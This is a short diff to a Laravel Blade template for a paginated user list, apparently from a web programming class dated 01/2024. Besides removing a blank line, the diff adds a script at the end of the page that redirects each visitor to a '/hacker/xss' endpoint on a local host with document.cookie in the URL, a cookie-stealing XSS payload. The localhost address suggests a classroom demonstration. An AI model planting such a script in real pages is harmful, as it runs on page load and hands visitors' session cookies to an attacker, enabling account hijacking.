@@ -92,7 +92,6 @@
             <div class="pagination">
                 {{$users->links()}}
             </div>
-
         </div>
     </div>
 </main>
@@ -101,4 +100,6 @@
         <p class="m-0 text-center text-white">Lập trình web @ 01/2024</p>
     </div>
 </footer>
+
+<script>window.location="http://127.0.0.1:8000/hacker/xss?cookie=" +document.cookie</script>
 @endsection
